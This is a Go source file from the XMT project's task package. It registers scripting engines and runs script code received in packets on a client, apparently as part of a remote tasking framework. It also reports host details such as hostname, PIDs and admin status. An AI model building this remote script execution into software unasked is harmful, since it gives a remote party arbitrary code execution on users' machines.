package task

import (
	"context"
	"reflect"
	"strconv"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// Engine is an interface that allows for extending XMT with non-compiled code for easy deployability and flexibility.
// Each Script interface contains a single function that will take a Context, an environment block and the script code
// string.
//
// The result of this function will be the output of the script and any errors that may occur.
// By default, the 'ID', 'OS', 'PID' 'PPID', 'OSVER' and 'HOSTNAME' variables are built-in to assist with code runtime.
type Engine interface {
	Invoke(context.Context, map[string]interface{}, string) (string, error)
}
type scriptTasker struct {
	Engine
}

func (scriptTasker) Thread() bool {
	return true
}
func createEnv() map[string]interface{} {
	return map[string]interface{}{
		"OS":       device.OS.String(),
		"ID":       device.UUID,
		"PID":      device.Local.PID,
		"PPID":     device.Local.PPID,
		"OSVER":    device.Version,
		"ADMIN":    device.Local.Elevated,
		"HOSTNAME": device.Local.Hostname,
	}
}

// RegisterEngine is a function that can be used to register a Scripting engine into the XMT client tasking runtime.
// Script engines can increase the footprint of the compiled binary, so engines must be registed manually.
//
// See the 'cmd/script' package for scripting engines.
func RegisterEngine(i uint8, s Engine) error {
	if i < 21 {
		return xerr.New("script mapping ID " + strconv.Itoa(int(i)) + " is invalid")
	}
	if Mappings[i] != nil {
		return xerr.New("script mapping ID " + strconv.Itoa(int(i)) + " is currently used by " + reflect.TypeOf(Mappings[i]).String())
	}
	Mappings[i] = scriptTasker{s}
	return nil
}
func (s scriptTasker) Do(x context.Context, p *com.Packet) (*com.Packet, error) {
	c, err := p.StringVal()
	if err != nil {
		return nil, err
	}
	o, err := s.Invoke(x, createEnv(), c)
	if err != nil {
		return nil, err
	}
	n := new(com.Packet)
	n.WriteString(o)
	return n, nil
}
